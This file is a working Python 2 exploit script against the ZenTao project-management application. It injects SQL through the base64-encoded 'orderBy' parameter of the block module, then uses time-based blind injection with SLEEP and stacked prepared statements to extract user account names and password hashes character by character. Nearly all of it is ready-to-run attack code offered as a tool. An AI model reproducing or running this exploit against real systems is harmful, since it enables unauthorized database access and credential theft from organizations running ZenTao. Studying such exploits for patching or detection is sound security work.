#!/usr/bin/env python
# -*- coding:utf-8 -*-
# form https://zhuanlan.zhihu.com/p/34275981
# author:c4bbage@qq.com
# weibo:http://weibo.com/s4turnus
"""
blind SQL injection script
"""
import requests
import json
import re
import binascii
import time
import string
from prettytable import PrettyTable

headers = {
    'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
    "Referer": ""}


def getVersion(url):
    uri = "/index.php?mode=getconfig"
    response = requests.get(url + uri, headers=headers)
    response = json.loads(response.text)
    print "[+]", "Zentao Version:", response['version']
    return response['version']


def getTablePrefix(url):
    """
    获取表前缀，此处用的是有mysql版本限制
    """
    # {"orderBy":"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#","num":"1,1","type":"openedbyme"}
    uri = "/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0="
    response = requests.get(url + uri, headers=headers)
    # print response.
    try:
        prefix = re.findall(r'\.`(.*)case`', response.text)[0]
    except Exception, e:
        return ""
    return prefix


def exp(url, query):
    """
    利用攻击模块
    """
    sql = "SET @SQL=0x%s;PREPARE pord FROM @SQL;EXECUTE pord;" % query
    # {"orderBy":"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#","num":"1,1","type":"openedbyme"}
    payload = {
        "orderBy": "order limit 1,1;%s#" % sql, "num": "1,1", "type": "openedbyme"}
    # print binascii.b2a_base64(json.dumps(payload))
    uri = "/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=%s" % binascii.b2a_base64(
        json.dumps(payload))
    response = requests.get(url + uri, headers=headers)
    return response.text


def dumpUser(url, prefix):
    """
    获取所有用户 id,account,password
    """
    payloads = list(string.ascii_lowercase)
    payloads += list(string.ascii_uppercase)
    for i in range(0, 10):
        payloads.append(str(i))
    payloads += ['@', '_', '.']
    # 获取用户个数
    userCount = 0
    userMax = 0
    # 判定人数范围
    for i in range(0, 1000, 100):
        query = binascii.b2a_hex(
            "select(if((select count(*) from %suser)>%s,sleep(3),1))" % (prefix, i.__str__()))
        startTime = time.time()
        exp(url, query)
        if time.time() - startTime > 2:
            print "[+]", "Zentao User count > %d" % i
            pass
        else:
            userMax = i
            print "[+]", "Zentao User count < %d" % i
            break
    # 确定人数范围
    for i in range(userMax - 100, userMax):
        query = binascii.b2a_hex(
            "select(if((select count(*) from %suser)=%s,sleep(3),1))" % (prefix, i.__str__()))
        startTime = time.time()
        exp(url, query)
        if time.time() - startTime > 2:
            userCount = i
            break
    if userCount < 1:
        exit(u"无用户")
    print "[+]", "zentao User count:", userCount
    fields = ["account", "password"]
    table = PrettyTable(fields)
    for i in range(5):
        user = {}.fromkeys(fields, "")
        for field in fields:
            # 获取字段长度
            fieldLength = 0
            for fl in range(50):
                query = binascii.b2a_hex(
                    "select(if((select length(%s) from %suser limit %d,1)=%s,sleep(3),1))" % (field, prefix, i, fl.__str__()))
                startTime = time.time()
                exp(url, query)
                if time.time() - startTime > 2:
                    fieldLength = fl
                    break
            print "[+]", field, "length:", fieldLength
            # 获取字段内容
            for l in range(fieldLength):
                for x in payloads:
                    # print "select(if((ord(mid((select account from zt_user limit
                    # %d,1),%d,1)))=%d,sleep(3),1))" %(i, l, ord(x))
                    # mid() mid("xyz",1,1)=x
                    query = binascii.b2a_hex(
                        "select(if((ord(mid((select %s from %suser limit %d,1),%d,1)))=%d,sleep(3),1))" % (field, prefix, i, l + 1, ord(x)))
                    startTime = time.time()
                    exp(url, query)
                    if time.time() - startTime > 2:
                        user[field] += x
                        break
        print "[+]", user
        table.add_row([user['account'], user['password']])
    return table


def main():
    url = "http://127.0.0.1/zentao/"
    headers['Referer'] = url
    version = getVersion(url)
    prefix = "zt_"
    if(getTablePrefix(url)):
        prefix = getTablePrefix(url)
    print dumpUser(url, prefix)


if __name__ == '__main__':
    main()
